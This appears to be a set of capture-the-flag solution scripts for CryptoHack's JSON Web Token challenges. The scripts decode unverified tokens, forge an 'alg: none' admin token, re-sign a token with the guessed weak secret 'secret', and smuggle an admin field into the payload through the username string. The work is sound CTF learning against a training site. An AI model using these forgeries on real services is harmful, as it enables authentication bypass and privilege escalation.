# JSON Web Tokens

## 1. Token Appreciation

```python
import jwt

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiY3J5cHRve2p3dF9jb250ZW50c19jYW5fYmVfZWFzaWx5X3ZpZXdlZH0iLCJ1c2VyIjoiQ3J5cHRvIE1jSGFjayIsImV4cCI6MjAwNTAzMzQ5M30.shKSmZfgGVvd2OSB2CGezzJ3N6WAULo3w9zCl_T47KQ"
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(decoded_token)
```

## 2. JWT Sessions

```text
Authorization
```

## 3. No Way JOSE

```python
import jwt
import requests
import json

url = "https://web.cryptohack.org/no-way-jose/"
username = "user"

token = requests.get(url + "create_session/" + username + "/").json()["session"]
header, payload, signature = token.split(".")
header = json.loads(jwt.utils.base64url_decode(header).decode())
payload = json.loads(jwt.utils.base64url_decode(payload).decode())
# print(header)
# print(payload)
header["alg"] = "none"
payload["admin"] = True

header = jwt.utils.base64url_encode(json.dumps(header).encode()).decode()
payload = jwt.utils.base64url_encode(json.dumps(payload).encode()).decode()
new_token = header + "." + payload + "." + signature

flag = requests.get(url + "authorise/" + new_token + "/").json()["response"]
print(flag)
```

## 4. JWT Secrets

[PyJWT README](https://pyjwt.readthedocs.io/en/stable/usage.html)

```python
import jwt
import requests
import json

url = "https://web.cryptohack.org/jwt-secrets/"
username = "user"
SECRET_KEY = "secret"

token = requests.get(url + "create_session/" + username + "/").json()["session"]
header, payload, signature = token.split(".")
payload = json.loads(jwt.utils.base64url_decode(payload).decode())
payload["admin"] = True

new_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
flag = requests.get(url + "authorise/" + new_token + "/").json()["response"]
print(flag)
```

## 6. JSON in JSON

```python
import jwt
import requests
import json

url = "https://web.cryptohack.org/json-in-json/"
username = "user\" , \"admin\": \"True"
SECRET_KEY = "secret"

token = requests.get(url + "create_session/" + username + "/").json()["session"]
header, payload, signature = token.split(".")
payload = json.loads(jwt.utils.base64url_decode(payload).decode())
print(payload)
flag = requests.get(url + "authorise/" + token + "/").json()["response"]
print(flag)
```
